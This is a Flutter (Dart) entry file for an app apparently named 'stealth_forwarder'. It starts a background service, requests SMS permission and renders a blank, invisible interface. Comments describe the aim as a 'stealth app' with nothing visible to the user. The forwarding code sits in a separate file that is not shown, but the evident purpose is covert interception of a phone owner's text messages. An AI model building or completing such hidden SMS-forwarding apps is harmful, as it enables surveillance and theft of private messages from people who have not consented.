import 'package:flutter/material.dart';
import 'package:stealth_forwarder/background_service.dart'; // Import the background service
import 'package:permission_handler/permission_handler.dart';

void main() async {
  // Required for Flutter an Pplugins to work before runApp()
  WidgetsFlutterBinding.ensureInitialized();

  // Initialize and start the background service
  await initializeService();

  // Request necessary permissions (example for SMS)
  // This is here for completeness; in a real stealth app,
  // permission handling would need to be more nuanced.
  await requestPermissions();

  // Even if we don't want a UI, Flutter needs to run an app.
  // We can run a minimal, non-visible app.
  runApp(const MinimalApp());
}

Future<void> requestPermissions() async {
  // Request multiple permissions
  Map<Permission, PermissionStatus> statuses = await [
    Permission.sms,
    // Add other permissions like FOREGROUND_SERVICE if needed by specific plugins
    // or Android versions, though flutter_background_service usually handles its own.
  ].request();

  if (statuses[Permission.sms]!.isGranted) {
    print("SMS Permission Granted");
  } else {
    print("SMS Permission Denied");
  }
  // Handle other permissions as needed
}

// A minimal app widget, which can be essentially invisible or show no UI.
class MinimalApp extends StatelessWidget {
  const MinimalApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    // Return an empty container or a widget that doesn't draw anything visible.
    // This is to satisfy Flutter's requirement of having a root widget.
    return const MaterialApp(
      home: Scaffold(
        // You could make this completely blank or a placeholder.
        // For a "stealth" app, you'd want nothing visible.
        body: SizedBox.shrink(),
      ),
      // This removes the debug banner
      debugShowCheckedModeBanner: false,
    );
  }
}
